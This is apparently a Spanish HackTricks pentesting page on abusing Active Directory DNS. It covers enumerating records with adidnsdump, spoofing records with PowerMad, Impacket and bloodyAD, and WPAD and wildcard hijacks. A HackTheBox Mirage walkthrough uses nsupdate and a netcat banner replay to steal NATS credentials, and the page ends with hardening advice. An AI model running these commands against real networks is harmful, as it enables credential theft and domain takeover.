# Registros DNS de AD

{{#include ../../banners/hacktricks-training.md}}

Por defecto **cualquier usuario** en Active Directory puede **enumerar todos los registros DNS** en las zonas DNS del Dominio o del Bosque, similar a una transferencia de zona (los usuarios pueden listar los objetos hijos de una zona DNS en un entorno AD).

La herramienta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite la **enumeración** y la **exportación** de **todos los registros DNS** de la zona con fines de reconocimiento en redes internas.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (abril 2025) añade salida JSON/Greppable (`--json`), resolución DNS multihilo y soporte para TLS 1.2/1.3 al enlazarse a LDAPS

Para más información lee [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Crear / Modificar registros (ADIDNS spoofing)

Debido a que el grupo **Authenticated Users** tiene **Create Child** en la DACL de la zona por defecto, cualquier cuenta de dominio (o cuenta de equipo) puede registrar registros adicionales. Esto puede usarse para traffic hijacking, NTLM relay coercion o incluso full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py se distribuye con Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas de ataque comunes

1. **Wildcard record** – `*.<zone>` convierte el servidor DNS de AD en un responder a nivel empresarial similar a LLMNR/NBNS spoofing. Puede abusarse para capturar hashes NTLM o para reenviarlos a LDAP/SMB. (Requiere que WINS-lookup esté deshabilitado.)
2. **WPAD hijack** – añade `wpad` (o un **NS** record que apunte a un host atacante para evadir la Global-Query-Block-List) y proxea de forma transparente las solicitudes HTTP salientes para recolectar credenciales. Microsoft parcheó los bypass wildcard/DNAME (CVE-2018-8320) pero **los registros NS siguen funcionando**.
3. **Stale entry takeover** – reclama la dirección IP que previamente pertenecía a una workstation y la entrada DNS asociada aún seguirá resolviendo, habilitando resource-based constrained delegation o ataques Shadow-Credentials sin tocar DNS en absoluto.
4. **DHCP → DNS spoofing** – en una implementación Windows DHCP+DNS por defecto, un atacante no autenticado en la misma subred puede sobrescribir cualquier A record existente (incluyendo controladores de dominio) enviando solicitudes DHCP forjadas que desencadenan actualizaciones dinámicas de DNS (Akamai “DDSpoof”, 2023). Esto concede machine-in-the-middle sobre Kerberos/LDAP y puede llevar a un compromiso completo del dominio.
5. **Certifried (CVE-2022-26923)** – cambia el `dNSHostName` de una cuenta de equipo que controlas, registra un A record coincidente y luego solicita un certificado para ese nombre para impersonar al DC. Herramientas como **Certipy** o **BloodyAD** automatizan completamente el flujo.

---

### Secuestro interno de servicios mediante entradas dinámicas obsoletas (estudio de caso NATS)

Cuando las actualizaciones dinámicas permanecen abiertas a todos los usuarios autenticados, **un nombre de servicio dado de baja puede ser reclamado de nuevo y apuntado a la infraestructura del atacante**. El Mirage HTB DC expuso el hostname `nats-svc.mirage.htb` tras el DNS scavenging, por lo que cualquier usuario de bajos privilegios podría:

1. **Confirmar que el registro falta** y obtener la SOA con `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Re-crear el registro** hacia una interfaz externa/VPN que controlan:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. Los clientes de NATS esperan ver un banner `INFO { ... }` antes de enviar credenciales, por lo que copiar un banner legítimo del broker real basta para recopilar secretos:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Cualquier cliente que resuelva el nombre secuestrado realizará un leak inmediato de su frame JSON `CONNECT` (incluyendo `"user"`/`"pass"`) al listener. Ejecutar el binario oficial `nats-server -V` en el host atacante, deshabilitar su redacción de logs, o simplemente sniffear la sesión con Wireshark arroja las mismas credenciales en texto claro porque TLS era opcional.

4. **Pivot with the captured creds** – en Mirage la cuenta NATS robada proporcionó acceso a JetStream, lo que expuso eventos históricos de autenticación que contenían nombres de usuario/contraseñas reutilizables de AD.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Detección y endurecimiento

* Denegar a **Authenticated Users** el permiso *Create all child objects* en zonas sensibles y delegar las actualizaciones dinámicas a una cuenta dedicada usada por DHCP.
* Si se requieren actualizaciones dinámicas, configura la zona en **Secure-only** y habilita **Name Protection** en DHCP para que solo el objeto de equipo propietario pueda sobrescribir su propio registro.
* Monitorea los event IDs de DNS Server 257/252 (dynamic update), 770 (zone transfer) y las escrituras LDAP a `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquea nombres peligrosos (`wpad`, `isatap`, `*`) con un registro intencionalmente benigno o mediante la Global Query Block List.
* Mantén los servidores DNS parchados – p. ej., los bugs RCE CVE-2024-26224 y CVE-2024-26231 alcanzaron **CVSS 9.8** y son explotables remotamente contra Domain Controllers.

## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, sigue siendo la referencia de facto para ataques wildcard/WPAD)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
